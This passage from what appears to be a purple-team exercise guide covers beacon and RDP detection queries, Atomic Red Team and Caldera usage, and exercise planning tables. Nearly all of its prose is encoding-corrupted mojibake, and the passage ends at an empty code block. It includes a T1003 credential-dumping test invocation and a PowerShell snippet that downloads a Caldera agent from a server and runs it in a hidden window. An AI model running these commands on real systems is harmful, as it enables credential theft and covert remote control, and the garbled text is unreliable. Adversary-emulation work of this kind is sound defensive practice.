1. **å‡è®¾**ï¼šæ”»å‡»è€…ä½¿ç”¨HTTP beaconï¼Œé—´éš”ä¸º60sï¼ŒUser-Agentä¼ªè£…ã€‚ 
2. **æ•°æ®å‡†å¤‡**ï¼šæŠ“å–ä»£ç†æ—¥å¿—ã€Zeek http.logã€‚
3. **åˆ†ææ­¥éª¤**ï¼š
   - è®¡ç®—æ¯ä¸ªæºIPçš„è¯·æ±‚é—´éš”æ–¹å·®ï¼›
   - ç­›é€‰Pathé•¿åº¦å›ºå®šã€çŠ¶æ€ç 200/204çš„è¯·æ±‚ï¼›
   - ä½¿ç”¨ç†µç®—æ³•è¯†åˆ«Cookie/URIå¼‚å¸¸ã€‚
4. **è„šæœ¬ç¤ºä¾‹ï¼ˆPythonï¼‰**ï¼š
```python
import pandas as pd

def detect_beacon(log_file):
    df = pd.read_csv(log_file)
    df['timestamp'] = pd.to_datetime(df['timestamp'])
    result = []
    for (src, dest), group in df.groupby(['src_ip', 'dest_ip']):
        group = group.sort_values('timestamp')
        interval = group['timestamp'].diff().dt.total_seconds().dropna()
        if len(interval) >= 5 and interval.std() < 5:
            result.append({'src': src, 'dest': dest, 'mean_interval': interval.mean()})
    return pd.DataFrame(result)
```
5. **è¾“å‡º**ï¼šå¯ç–‘IPåˆ—è¡¨ã€è¯·æ±‚ç‰¹å¾ã€æ—¥å¿—æ ·æœ¬ï¼Œæäº¤ç»™SOCè¿›ä¸€æ­¥åˆ†æã€‚

#### æ¡ˆä¾‹äºŒï¼šå¯ç–‘æ¨ªå‘RDPé“¾è·¯
- ä½¿ç”¨ElasticæŸ¥è¯¢ï¼ˆEQLï¼‰å¯»æ‰¾1å°æ—¶å†…åŒä¸€è´¦æˆ·ä»å¤šä¸ªä¸»æœºå‘èµ·RDPï¼š
```
sequence by TargetUserName with maxspan=1h
  [ authentication where LogonType == "10" ]
  [ authentication where LogonType == "10" ]
```
- åˆ†æç™»å½•æºã€ç›®æ ‡ã€åœ°ç†ä½ç½®ï¼ŒåŒ¹é…å·¥ä½œæ—¶é—´è¡¨ã€‚
- è¾“å‡ºç»“æœè¿›å…¥SOARï¼Œè‹¥å¼‚å¸¸åˆ™æ‰§è¡Œé”å®šè´¦æˆ·ã€‚

---

## æ¨¡å—å››ï¼šç´«é˜ŸååŒä¸æ”»é˜²èåˆ

### æ¨¡å—æ€»è§ˆï¼ˆååŒè§†è§’ï¼‰
- **å®šä½**ï¼šè®©çº¢è“åŒæ–¹åœ¨å¯æ§èŠ‚å¥ä¸‹å…±äº«çŸ¥è¯†ã€éªŒè¯æ£€æµ‹ã€å¿«é€Ÿå…³é—­é˜²å¾¡ç¼ºå£ï¼Œå®ç°â€œæ”»é˜²åŒå‘å¥”èµ´â€ã€‚
- **å…³é”®æˆæœ**ï¼š
  - Purple Team Playbookï¼ˆæ­¥éª¤ã€è¾“å…¥ã€è¾“å‡ºã€åº¦é‡ï¼‰
  - æ”»é˜²è”åŠ¨çœ‹æ¿ï¼ˆæ¼”ç»ƒè¿›åº¦ã€æ£€æµ‹ç»“æœã€è¡ŒåŠ¨é¡¹ï¼‰
  - æ£€æµ‹éªŒè¯è®°å½•ï¼ˆDetection Validation Recordï¼‰ä¸æ”¹è¿›é¡¹è¿½è¸ª
- **åä½œå¾ªç¯**ï¼šPlan â†’ Execute â†’ Detect â†’ Measure â†’ Improveã€‚

#### ç´«é˜Ÿä½œæˆ˜ç”»å¸ƒï¼ˆPurple Team Canvasï¼‰
| åŒºåŸŸ | æ ¸å¿ƒå†…å®¹ | è´Ÿè´£äºº |
| --- | --- | --- |
| æ¼”ç»ƒç›®æ ‡ | ä¸šåŠ¡åœºæ™¯ã€å…³é”®èµ„äº§ã€æˆåŠŸå‡†åˆ™ | ç™½é˜Ÿ/ä¸šåŠ¡è´Ÿè´£äºº |
| æ”»å‡»å‡è®¾ | å¯¹åº”çš„MITREæˆ˜æœ¯ã€æ”»å‡»è·¯å¾„ã€å·¥å…· | çº¢é˜Ÿ |
| æ£€æµ‹å‡è®¾ | é¢„æœŸè§¦å‘è§„åˆ™ã€æ•°æ®æºã€æ—¥å¿—å­—æ®µ | è“é˜Ÿ |
| éªŒè¯æ–¹å¼ | åŸå­åŒ–æµ‹è¯•ã€Calderaä»»åŠ¡ã€è„šæœ¬ | ç´«é˜Ÿ |
| æˆåŠŸæ ‡å‡† | æ£€æµ‹æ—¶é—´ã€å‘Šè­¦çº§åˆ«ã€å“åº”åŠ¨ä½œ | è“é˜Ÿ/ç™½é˜Ÿ |
| æ”¹è¿›è®¡åˆ’ | å·¥å…·æ›´æ–°ã€æµç¨‹ä¼˜åŒ–ã€åŸ¹è®­éœ€æ±‚ | ç´«é˜Ÿç»Ÿç­¹ |

> ç´«é˜Ÿæ˜¯â€œç¿»è¯‘å®˜â€ä¸â€œæ•™ç»ƒâ€ï¼Œæ ¸å¿ƒåœ¨äºæŠŠä¸€æ¬¡æ¬¡æ”»é˜²å¯¹æŠ—è½¬åŒ–ä¸ºå¯æµ‹é‡ã€å¯è¿½è¸ªçš„æ”¹è¿›è¿­ä»£ã€‚

### 4.1 ç´«é˜Ÿæ¦‚å¿µ

**ç´«é˜Ÿä½œç”¨**:
```
1. çŸ¥è¯†å…±äº«
   - çº¢é˜Ÿåˆ†äº«æ”»å‡»æŠ€æœ¯
   - è“é˜Ÿåˆ†äº«æ£€æµ‹æ–¹æ³•
   - å…±åŒæå‡èƒ½åŠ›

2. ååŒæ¼”ç»ƒ
   - å—æ§ç¯å¢ƒä¸‹æ”»é˜²
   - å®æ—¶åé¦ˆä¼˜åŒ–
   - å¿«é€Ÿè¿­ä»£æ”¹è¿›

3. å·¥å…·å¼€å‘
   - æ”»å‡»æ¨¡æ‹Ÿå·¥å…·
   - æ£€æµ‹è§„åˆ™ä¼˜åŒ–
   - è‡ªåŠ¨åŒ–å“åº”

4. æŒç»­æ”¹è¿›
   - å®šæœŸè¯„ä¼°é˜²å¾¡
   - æ›´æ–°æ£€æµ‹è§„åˆ™
   - å®Œå–„å“åº”æµç¨‹
```

### 4.2 ååŒæ¼”ç»ƒ

**Atomic Red Team**:
```powershell
# Atomic Red Team - åŸå­åŒ–æ”»å‡»æµ‹è¯•

# å®‰è£…
Install-Module -Name invoke-atomicredteam -Scope CurrentUser
Import-Module invoke-atomicredteam

# åˆ—å‡ºæ‰€æœ‰æµ‹è¯•
Invoke-AtomicTest All -ShowDetailsBrief

# æ‰§è¡Œç‰¹å®šæµ‹è¯•ï¼ˆT1003 - Credential Dumpingï¼‰
Invoke-AtomicTest T1003

# ä»…æ˜¾ç¤ºæµ‹è¯•è¯¦æƒ…ï¼Œä¸æ‰§è¡Œ
Invoke-AtomicTest T1003 -ShowDetails

# æ¸…ç†æµ‹è¯•ç—•è¿¹
Invoke-AtomicTest T1003 -Cleanup

# è‡ªå®šä¹‰æµ‹è¯•
Invoke-AtomicTest T1003.001 -InputArgs @{
    "output_file" = "C:\temp\credentials.txt"
}

# æ‰¹é‡æ‰§è¡Œæµ‹è¯•
$tests = @("T1003", "T1059", "T1055")
foreach ($test in $tests) {
    Write-Host "[*] æ‰§è¡Œæµ‹è¯•: $test"
    Invoke-AtomicTest $test

    # ç­‰å¾…è“é˜Ÿæ£€æµ‹
    Start-Sleep -Seconds 60

    # æ¸…ç†
    Invoke-AtomicTest $test -Cleanup
}
```

**Calderaè‡ªåŠ¨åŒ–å¯¹æŠ—å¹³å°**:
```yaml
# Calderaæ“ä½œé…ç½®

# 1. å®‰è£…Caldera
git clone https://github.com/mitre/caldera.git
cd caldera
pip3 install -r requirements.txt
python3 server.py --insecure

# 2. è®¿é—®ç•Œé¢
http://localhost:8888

# 3. éƒ¨ç½²Agent
# Windows
server="http://caldera-server:8888"
agent="sandcat"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9)
[io.file]::WriteAllBytes("$env:TEMP\$name",$data)
Start-Process -FilePath $env:TEMP\$name -ArgumentList "-server $server -group red" -WindowStyle hidden

# 4. åˆ›å»ºå¯¹æŠ—è¡ŒåŠ¨
operation:
  name: "APTæ¨¡æ‹Ÿ"
  group: "red"
  planner: "atomic"
  adversary: "APT29"

  facts:
    - trait: "host.user.name"
      value: "administrator"
    - trait: "domain.controller"
      value: "dc.internal.com"

  steps:
    - technique: "T1078"  # Valid Accounts
      executor: "psh"

    - technique: "T1003"  # Credential Dumping
      executor: "psh"

    - technique: "T1021"  # Remote Services
      executor: "psh"

# 5. ç›‘æ§æ‰§è¡Œ
# Calderaæä¾›å®æ—¶æ‰§è¡Œç›‘æ§å’Œç»“æœæ”¶é›†
```

### ç´«é˜Ÿè”åŠ¨èŠ‚å¥å»ºè®®
| å‘¨æœŸ | æ­¥éª¤ | ä¸»è¦ä»»åŠ¡ | äº§å‡º |
| --- | --- | --- | --- |
| Day 0 (Kick-off) | ç›®æ ‡å¯¹é½ | æ˜ç¡®ä¸šåŠ¡åœºæ™¯ã€æ”»é˜²ä¸»é¢˜ã€æ•°æ®æºæ¥å…¥ | æ”»é˜²ç›®æ ‡æ¸…å•ã€æ•°æ®å‡†å¤‡è®¡åˆ’ |
| Day 1-2 | æ”»å‡»è„šæœ¬å‡†å¤‡ | çº¢é˜Ÿç¼–å†™Atomic/Calderaè„šæœ¬ï¼Œç™½é˜Ÿç¡®è®¤å®‰å…¨é˜ˆå€¼ | æ”»å‡»è„šæœ¬ã€å›æ»šæ–¹æ¡ˆ |
| Day 3 | æ”»å‡»æ‰§è¡Œ | çº¢é˜Ÿæ‰§è¡Œåœºæ™¯æ”»å‡»ï¼Œè“é˜Ÿå®æ—¶è§‚å¯Ÿå¹¶è®°å½•æ—¥å¿— | æ”»å‡»æ—¥å¿—ã€æ£€æµ‹è®°å½• |
| Day 4 | æ£€æµ‹éªŒè¯ | è“é˜Ÿè°ƒè¯•è§„åˆ™ã€SOARæµç¨‹ï¼ŒéªŒè¯å‘Šè­¦ä¸è‡ªåŠ¨åŒ–å“åº” | æ£€æµ‹éªŒè¯æŠ¥å‘Šã€è¯¯æŠ¥æ¸…å• |
| Day 5 | æ”¹è¿›è¿­ä»£ | ç´«é˜Ÿä¸»æŒå¤ç›˜ï¼Œå½¢æˆè¡ŒåŠ¨é¡¹å¹¶åˆ†é…è´£ä»»äºº | æ”¹è¿›è®¡åˆ’ã€æŒ‡æ ‡æ›´æ–° |

### æ£€æµ‹éªŒè¯è®°å½•æ¨¡æ¿ï¼ˆDetection Validation Recordï¼‰
```markdown
- åœºæ™¯ç¼–å·ï¼šPT-2024-001
- MITREæ˜ å°„ï¼šT1059.001 PowerShellã€T1047 WMI
- æ”»å‡»æè¿°ï¼šä½¿ç”¨PowerShellä¸‹è½½æ‰§è¡Œpayloadï¼Œéšåé€šè¿‡WMIæ¨ªå‘ç§»åŠ¨
- æœŸæœ›æ£€æµ‹ï¼š
  - è§„åˆ™Aï¼ˆEDR-PS-Encodedï¼‰ï¼šå‘½ä¸­ï¼Œä¸¥é‡çº§
  - è§„åˆ™Bï¼ˆSIEM-WMI-Execï¼‰ï¼šæœªå‘½ä¸­
- å®é™…ç»“æœï¼š
  - AæˆåŠŸè§¦å‘ï¼Œå“åº”è€—æ—¶12åˆ†é’Ÿ
  - Bæœªè§¦å‘ï¼ŒåŸå› ï¼šç¼ºå°‘4292äº‹ä»¶æ—¥å¿—
- æ”¹è¿›æªæ–½ï¼š
  - å¼€å¯ç›®æ ‡ä¸»æœºWMIæ—¥å¿—
  - æ–°å¢Sigmaè§„åˆ™`wmi_remote_process_creation`
  - å°†æ£€æµ‹çº³å…¥SOAR Playbook
- å¤æµ‹è®¡åˆ’ï¼šæ”¹åŠ¨å®Œæˆå48å°æ—¶å†…å¤æµ‹
```

### æ”»é˜²è”åŠ¨æŒ‡æ ‡ï¼ˆPurple KPIï¼‰
- æ”»é˜²éªŒè¯å®Œæˆç‡ = å®ŒæˆéªŒè¯åœºæ™¯æ•° / è®¡åˆ’åœºæ™¯æ€»æ•° â‰¥ 90%
- æ£€æµ‹è¾¾æ ‡ç‡ = æˆåŠŸè§¦å‘æ£€æµ‹çš„åœºæ™¯æ•° / æ€»åœºæ™¯æ•° â‰¥ 75%
- ç¼©çŸ­å‘¨æœŸ = ä»åœºæ™¯æå‡ºåˆ°æ£€æµ‹ä¸Šçº¿å¹³å‡æ—¶é—´ â‰¤ 10å¤©
- è¡ŒåŠ¨é¡¹å…³é—­ç‡ = 30å¤©å†…å…³é—­æ”¹è¿›é¡¹ / æ”¹è¿›é¡¹æ€»æ•° â‰¥ 85%

---

## æ¨¡å—äº”ï¼šå¯¹æŠ—æ¼”ç»ƒè®¾è®¡ä¸è½åœ°

### æ¨¡å—æ€»è§ˆï¼ˆæ¼”ç»ƒè§†è§’ï¼‰
- **ç›®æ ‡**ï¼šä»æˆ˜ç•¥åˆ°æ‰§è¡Œå…¨é¢è®¾è®¡çº¢è“å¯¹æŠ—æ¼”ç»ƒè®¡åˆ’ï¼Œç¡®ä¿â€œå¯æ§ã€å¯æµ‹ã€å¯å¤ç°â€ï¼Œå¹¶å°†ä¸šåŠ¡å½±å“æ§åˆ¶åœ¨å¯æ¥å—èŒƒå›´å†…ã€‚
- **æ ¸å¿ƒäº¤ä»˜ç‰©**ï¼š
  - æ¼”ç»ƒè®¡åˆ’ä¹¦ï¼ˆç›®æ ‡ã€èŒƒå›´ã€æ—¶é—´ã€èµ„æºã€é£é™©æ§åˆ¶ï¼‰
  - æ²Ÿé€šä¸æ±‡æŠ¥æœºåˆ¶ï¼ˆæ—¥æŠ¥ã€å‘¨æŠ¥ã€å‘Šè­¦å‡çº§æµç¨‹ï¼‰
  - è¯æ®ä¸æŒ‡æ ‡åº“ï¼ˆæ—¥å¿—ã€æˆªå›¾ã€æ—¶é—´çº¿ã€è¯„åˆ†è¡¨ï¼‰
  - æ¼”ç»ƒæŠ¥å‘Šã€æ”¹è¿›è®¡åˆ’ã€æŒ‡æ ‡è·Ÿè¸ªè¡¨
- **å…³é”®æµç¨‹**ï¼šDefine â†’ Prepare â†’ Execute â†’ Evaluate â†’ Improveã€‚

#### æ¼”ç»ƒç­¹å¤‡ä¹æ­¥æ³•
1. æ˜ç¡®ä¸šåŠ¡ç›®æ ‡ä¸æŒ‡æ ‡ï¼ˆå¦‚æ”»å‡»é¢ç¼©å‡ã€æ£€æµ‹æ—¶å»¶<15åˆ†é’Ÿï¼‰ã€‚
2. æ¢³ç†å…³é”®èµ„äº§ã€æ•°æ®åˆ†çº§ä¸ä¾›åº”é“¾ä¾èµ–ï¼Œå»ºç«‹ä¼˜å…ˆçº§çŸ©é˜µã€‚
3. å®Œæˆé£é™©è¯„ä¼°ä¸å½±å“çŸ©é˜µï¼Œè®¾å®šä¸­æ­¢æ¡ä»¶ä¸å›æ»šæ–¹æ¡ˆã€‚
4. è®¾è®¡æ”»å‡»/é˜²å¾¡åœºæ™¯ä¸å¯¹åº”æˆåŠŸåˆ¤å®šæ ‡å‡†ã€‚
5. å‡†å¤‡æ¼”ç»ƒç¯å¢ƒï¼ˆé¶åœºã€VPNã€æ—¥å¿—ç®¡é“ã€å¿«ç…§/å¤‡ä»½ã€æ¼”ç»ƒå·¥å•ç³»ç»Ÿï¼‰ã€‚
6. å»ºç«‹é€šä¿¡æ¸ é“ã€å€¼ç­è¡¨ã€è¯æ®å‘½åè§„èŒƒåŠæ–‡æ¡£æ¨¡æ¿ã€‚
7. è¿›è¡Œæ¡Œé¢æ¼”ç»ƒï¼ˆTabletopï¼‰æˆ–çº¢è“å½±å­æ¼”ç»ƒé¢„æ¼”ã€‚
8. æ­£å¼è¿è¡Œæ¼”ç»ƒå¹¶ä½¿ç”¨Runbookè®°å½•æ¯ä¸ªè¡ŒåŠ¨ã€æ—¶é—´ã€å½±å“ã€‚
9. æ¼”ç»ƒç»“æŸåå¼€å±•å¤ç›˜ã€è¡ŒåŠ¨é¡¹è·Ÿè¸ªã€ç»éªŒæ²‰æ·€ä¸åŸ¹è®­ã€‚

### 5.1 æ¼”ç»ƒè§„åˆ’

#### æ¼”ç»ƒèŒƒå›´å®šä¹‰

**èŒƒå›´çŸ©é˜µ**:
```
èµ„äº§ç±»å‹        | æ˜¯å¦åŒ…å« | é™åˆ¶æ¡ä»¶
---------------|---------|------------------
å¤–ç½‘WebæœåŠ¡å™¨   | âœ“       | ç¦æ­¢DDoSæ”»å‡»
å†…ç½‘åŠå…¬PC      | âœ“       | åŠå…¬æ—¶é—´å¤–æµ‹è¯•
åŸŸæ§åˆ¶å™¨        | âœ“       | åªè¯»æ“ä½œï¼Œç¦æ­¢ä¿®æ”¹
æ•°æ®åº“æœåŠ¡å™¨    | âœ“       | ç¦æ­¢åˆ é™¤æ•°æ®
ç”Ÿäº§ç¯å¢ƒ        | âœ—       | å®Œå…¨æ’é™¤
ç¬¬ä¸‰æ–¹ç³»ç»Ÿ      | âœ—       | æœªè·æˆæƒ
```

**æ—¶é—´å®‰æ’**:
```
é˜¶æ®µ          | æ—¶é—´       | ä¸»è¦æ´»åŠ¨
-------------|-----------|------------------
å‡†å¤‡é˜¶æ®µ      | 2å‘¨       | ç¯å¢ƒå‡†å¤‡ã€è§„åˆ™åˆ¶å®š
çº¢é˜Ÿä¾¦å¯Ÿ      | 3å¤©       | è¢«åŠ¨ä¿¡æ¯æ”¶é›†
çº¢é˜Ÿæ”»å‡»      | 7å¤©       | ä¸»åŠ¨æ¸—é€æµ‹è¯•
è“é˜Ÿç›‘æ§      | æŒç»­      | 7x24å°æ—¶ç›‘æ§
æ¯æ—¥å¤ç›˜      | æ¯æ™š1å°æ—¶  | æ€»ç»“å½“æ—¥æ”»é˜²
æœ€ç»ˆå¤ç›˜      | 2å¤©       | å…¨é¢æ€»ç»“æŠ¥å‘Š
```

### æ¼”ç»ƒæ§åˆ¶å¡”ï¼ˆControl Towerï¼‰é…ç½®
- **ä»»åŠ¡çœ‹æ¿**ï¼šä½¿ç”¨Jira/Trelloè®¾ç½®æ³³é“ï¼ˆçº¢é˜Ÿã€è“é˜Ÿã€ç™½é˜Ÿã€é£é™©ï¼‰ï¼Œè®°å½•ä»»åŠ¡çŠ¶æ€ã€é˜»å¡é¡¹ä¸è´£ä»»äººã€‚
- **å®æ—¶æ²Ÿé€š**ï¼šå»ºç«‹ä¸“ç”¨IMç¾¤ç»„ï¼ˆé’‰é’‰/Slack/Teamsï¼‰ï¼Œé…ç½®æœºå™¨äººæ¨é€å…³é”®å‘Šè­¦ã€è¡ŒåŠ¨é¡¹ï¼Œæ‰€æœ‰è¯­éŸ³éœ€åœ¨30åˆ†é’Ÿå†…å½¢æˆçºªè¦ã€‚
- **è¯æ®å­˜å‚¨**ï¼šä½¿ç”¨åŠ å¯†æ–‡ä»¶åº“ï¼ˆNextcloud/SharePointï¼‰ï¼ŒæŒ‰ç…§`YYYYMMDD-å›¢é˜Ÿ-ç¼–å·`å‘½åï¼Œç™½é˜Ÿè´Ÿè´£æƒé™å®¡è®¡ä¸ç‰ˆæœ¬ç®¡ç†ã€‚
- **æŒ‡æ ‡é¢æ¿**ï¼šåœ¨Grafana/PowerBIå±•ç¤ºå…³é”®æŒ‡æ ‡ï¼ˆæ£€æµ‹è€—æ—¶ã€å“åº”è€—æ—¶ã€æˆåŠŸç‡ã€é£é™©è¯„åˆ†ï¼‰ï¼Œæ¯æ™šå¿«ç…§å½’æ¡£ã€‚
- **é£é™©å°è´¦**ï¼šç™½é˜Ÿç»´æŠ¤`Risk Register`ï¼ŒåŒ…å«é£é™©æè¿°ã€å½±å“åº¦ã€å¯èƒ½æ€§ã€ç¼“è§£æªæ–½ã€è´Ÿè´£äººã€çŠ¶æ€ã€‚

### æ²Ÿé€šå‡çº§æµç¨‹ï¼ˆCommunication Escalationï¼‰
| ç­‰çº§ | è§¦å‘æ¡ä»¶ | é€šçŸ¥å¯¹è±¡ | å“åº”æ—¶é™ | å¤‡æ³¨ |
| --- | --- | --- | --- | --- |
| L0 æ—¥å¸¸ | å¸¸è§„è¡ŒåŠ¨ã€ä½é£é™©å‘Šè­¦ | çº¢/è“é˜Ÿæ“ä½œå‘˜ | å³æ—¶è®°å½• | æ—¥æŠ¥æ±‡æ€» |
| L1 è­¦ç¤º | è§¦å‘é«˜å±èµ„äº§ã€å¯èƒ½å½±å“æ•æ„Ÿæ•°æ® | çº¢/è“é˜Ÿè´Ÿè´£äººã€ç™½é˜Ÿ | 10åˆ†é’Ÿå†… | å¯åŠ¨å½±å“è¯„ä¼° |
| L2 é‡å¤§ | ä¸šåŠ¡ä¸­æ–­é£é™©ã€è¯¯æ“ä½œå½±å“ç”Ÿäº§ | CISOã€ITè´Ÿè´£äººã€ä¸šåŠ¡è´Ÿè´£äºº | 5åˆ†é’Ÿå†… | è¯„ä¼°æ˜¯å¦æš‚åœæ¼”ç»ƒ |
| L3 å±æœº | å®é™…é€ æˆé‡å¤§å½±å“æˆ–èˆ†æƒ…é£é™© | é«˜ç®¡ã€æ³•åŠ¡ã€PR | ç«‹å³ | è¿›å…¥åº”æ€¥å“åº”æµç¨‹ |

> æ‰€æœ‰å‡çº§éœ€è®°å½•åœ¨æ¼”ç»ƒæ—¥å¿—ä¸­ï¼ŒåŒ…å«æ—¶é—´ã€è§¦å‘åŸå› ã€æªæ–½ã€ç»“æœï¼›æ¼”ç»ƒç»“æŸåçº³å…¥å¤ç›˜ææ–™ã€‚

### 5.2 æŒ‡æ ‡ä½“ç³»ä¸è¯„åˆ†æ¨¡å‹
| ç»´åº¦ | æŒ‡æ ‡ | è¯„åˆ†æ ‡å‡† | è¯´æ˜ |
| --- | --- | --- | --- |
| çº¢é˜ŸæˆåŠŸç‡ | æ”»å‡»è·¯å¾„å®Œæˆåº¦ | æˆåŠŸå®Œæˆå®Œæ•´é“¾è·¯å¾—20åˆ†ï¼›éƒ¨åˆ†å®Œæˆ10åˆ†ï¼›å¤±è´¥0åˆ† | æ ¹æ®æ”»å‡»é“¾æ¡æ•°é‡ç´¯è®¡ |
| çº¢é˜Ÿéšè”½æ€§ | è¢«æ£€æµ‹æ—¶å»¶ | æœªè¢«å‘ç°å¾—20åˆ†ï¼›è¢«å‘ç°ä½†>2å°æ—¶10åˆ†ï¼›<2å°æ—¶5åˆ† | éœ€è®°å½•æ£€æµ‹æ—¶é—´ | 
| è“é˜Ÿæ£€æµ‹ç‡ | å‘Šè­¦å‘½ä¸­ | å…³é”®é˜¶æ®µå‘Šè­¦20åˆ†ï¼›éƒ¨åˆ†å‘½ä¸­10åˆ†ï¼›æœªå‘½ä¸­0åˆ† | ç»“åˆåº”æ€¥å·¥å• |
| è“é˜Ÿå“åº” | å“åº”æ—¶æ•ˆ | <30åˆ†é’Ÿ20åˆ†ï¼›30-60åˆ†é’Ÿ10åˆ†ï¼›>60åˆ†é’Ÿ5åˆ† | ä»¥SOAR/å·¥å•æ—¶é—´ä¸ºå‡† |
| ååŒæ”¹è¿› | è¡ŒåŠ¨é¡¹äº¤ä»˜ | 30å¤©å†…å®Œæˆ>90%è¡ŒåŠ¨é¡¹20åˆ†ï¼›70%-90% 10åˆ†ï¼›<70% 5åˆ† | ç™½é˜Ÿè·Ÿè¸ª |

**æ•°æ®æ”¶é›†æ–¹æ³•**ï¼š
- ä½¿ç”¨æ¼”ç»ƒæ§åˆ¶å¡”çœ‹æ¿è‡ªåŠ¨ç»Ÿè®¡åˆ†æ•°ï¼Œæ”¯æŒå¯¼å‡ºCSVã€‚
- æ¯å¤©ä¾‹ä¼šæ›´æ–°å¾—åˆ†ï¼Œé˜²æ­¢é—æ¼ã€‚
- åˆ†æé«˜åˆ†/ä½åˆ†åŸå› ï¼Œå½¢æˆç»éªŒåº“ã€‚

### 5.3 æ¼”ç»ƒæ–‡æ¡£ä¸æ—¶é—´çº¿ç¤ºä¾‹
```
2024-05-06 (Day 0)
09:00 Kick-offä¼šè®®ï¼Œç¡®è®¤æˆæƒä¹¦ä¸ä¸­æ­¢æ¡ä»¶
13:30 çº¢é˜Ÿå¼€å§‹è¢«åŠ¨ä¾¦å¯Ÿ
16:00 è“é˜Ÿå®Œæˆæ—¥å¿—å¥åº·æ£€æŸ¥

2024-05-07 (Day 1)
10:20 çº¢é˜ŸæˆåŠŸé’“é±¼ï¼Œè·å–VPNå‡­è¯
10:35 ç™½é˜Ÿè®°å½•äº‹ä»¶ç¼–å· RT-2024-001
10:50 è“é˜Ÿå°šæœªå‘ç°
14:10 è“é˜ŸSIEMå‘Šè­¦ï¼Œè§¦å‘å“åº”æµç¨‹ï¼Œå¼€å§‹éš”ç¦»è´¦å·
16:30 ç´«é˜Ÿä¼šè®®ï¼Œç¡®è®¤éœ€æ–°å¢æ£€æµ‹è§„åˆ™

2024-05-08 (Day 2)
09:15 çº¢é˜Ÿæ¨ªå‘åˆ°æ•°æ®åº“æœåŠ¡å™¨
09:20 è“é˜ŸEDRæ•è·å¼‚å¸¸ï¼Œå¯ç–‘å‘½ä»¤`sqlcmd`
09:30 è“é˜Ÿé˜»æ–­ä¼šè¯å¹¶æ”¶é›†è¯æ®
11:00 ç™½é˜Ÿæ›´æ–°é£é™©å°è´¦ï¼Œç­‰çº§L1
17:00 æ—¥æŠ¥è¾“å‡ºï¼Œåˆ—å‡º3ä¸ªè¡ŒåŠ¨é¡¹
```

### 5.4 é£é™©çŸ©é˜µç¤ºä¾‹
| é£é™©ID | æè¿° | å¯èƒ½æ€§ (1-5) | å½±å“ (1-5) | é£é™©ç­‰çº§ | ç¼“è§£æªæ–½ | è´Ÿè´£äºº |
| --- | --- | --- | --- | --- | --- | --- |
| R-01 | æ¼”ç»ƒå¯¼è‡´ç”Ÿäº§æ•°æ®è¢«ä¿®æ”¹ | 2 | 5 | 10 (é«˜) | ä»…åœ¨ä»¿çœŸç¯å¢ƒæ‰§è¡Œã€ç™½é˜Ÿå®æ—¶ç›‘æ§ | ç™½é˜Ÿè´Ÿè´£äºº |
| R-02 | é’“é±¼é‚®ä»¶è¢«å¤–éƒ¨äººå‘˜æ”¶åˆ° | 3 | 4 | 12 (é«˜) | ä½¿ç”¨ç™½åå•é‚®ç®±ã€å•æ‰¹æ¬¡<50å° | çº¢é˜Ÿè´Ÿè´£äºº |
| R-03 | æ¼”ç»ƒæ—¥å¿—ä¸¢å¤± | 2 | 4 | 8 (ä¸­) | ä½¿ç”¨é›†ä¸­æ—¥å¿—ä¸å¤‡ä»½ | è“é˜Ÿæ—¥å¿—ç®¡ç†å‘˜ |
| R-04 | å…³é”®äººå‘˜ç¼ºå¸­ | 3 | 3 | 9 (ä¸­) | åˆ¶å®šæ›¿è¡¥è®¡åˆ’ã€æå‰ç¡®è®¤æ’ç­ | ç™½é˜Ÿåè°ƒ |
| R-05 | æ”»å‡»å½±å“ç”¨æˆ·ä½“éªŒ | 2 | 3 | 6 (ä¸­) | åˆ¶å®šé€šçŸ¥æ¨¡æ¿ï¼Œé¢„ç•™å›æ»šæ—¶é—´ | ç™½é˜Ÿ+ä¸šåŠ¡ |

### 5.5 æ¼”ç»ƒä¿¡æ¯æŠ«éœ²æ¨¡æ¿
```markdown
è‡´ï¼šå…¨ä½“å‘˜å·¥
ä¸»é¢˜ï¼šå…³äºXXæ”»é˜²æ¼”ç»ƒçš„é€šçŸ¥
æ—¶é—´ï¼š2024å¹´5æœˆ6æ—¥-5æœˆ17æ—¥ï¼ˆæ¯æ—¥09:00-18:00ï¼‰
èŒƒå›´ï¼šå…¬å¸å†…ç½‘åŠå…¬ç³»ç»Ÿã€VPNã€éƒ¨åˆ†ä¸šåŠ¡ç³»ç»Ÿ
å½±å“ï¼šæ¼”ç»ƒæœŸé—´å¯èƒ½å‡ºç°ç™»å½•å‘Šè­¦ã€é‚®ä»¶é€šçŸ¥ï¼Œè¯·æŒ‰ç…§æŒ‡å¼•åé¦ˆ
åº”å¯¹ï¼šå¦‚é‡å¼‚å¸¸è¯·åŠæ—¶è”ç³»SOCï¼ˆsoc@corp.com / 400-xxx-xxxxï¼‰
è¯´æ˜ï¼šæœ¬æ¬¡æ¼”ç»ƒå·²è·å¾—æˆæƒï¼Œä¸ä¼šå½±å“ç”Ÿäº§æ•°æ®å®‰å…¨ã€‚å¦‚æœ‰ç–‘é—®è¯·è”ç³»ç™½é˜Ÿè´Ÿè´£äººã€‚
```

### 5.6 æ¼”ç»ƒæŠ¥å‘Šé€ŸæŸ¥è¡¨
- `Executive Summary`ï¼šæ•´ä½“ç›®æ ‡ã€æˆæ•ˆã€è¯„åˆ†ã€å…³é”®é£é™©ã€‚
- `Findings Table`ï¼šé«˜/ä¸­/ä½é£é™©åˆ—è¡¨ã€å½±å“ã€å»ºè®®ã€è´Ÿè´£äººã€æˆªæ­¢æ—¶é—´ã€‚
- `Attack Path`ï¼šå›¾å½¢åŒ–å±•ç¤ºæ”»å‡»é“¾ï¼ˆå·¥å…·ï¼šdraw.ioã€PowerPointã€Obsidian Canvasï¼‰ã€‚
- `Detection & Response Timeline`ï¼šå›¾è¡¨å±•ç¤ºMTTDã€MTTRã€å…³é”®å‘Šè­¦ã€‚
- `Improvement Backlog`ï¼šè¡ŒåŠ¨é¡¹ç¼–å·ã€æè¿°ã€è´£ä»»äººã€ç›®æ ‡æ—¥æœŸã€çŠ¶æ€ã€‚
- `Appendix`ï¼šæ—¥å¿—æ ·æœ¬ã€æˆªå›¾ã€å‘½ä»¤ã€å“ˆå¸Œå€¼ã€å‚è€ƒèµ„æ–™ã€‚

### 5.2 åœºæ™¯è®¾è®¡

#### APTæ”»å‡»æ¨¡æ‹Ÿåœºæ™¯

**æ”»å‡»é“¾è®¾è®¡**:
```
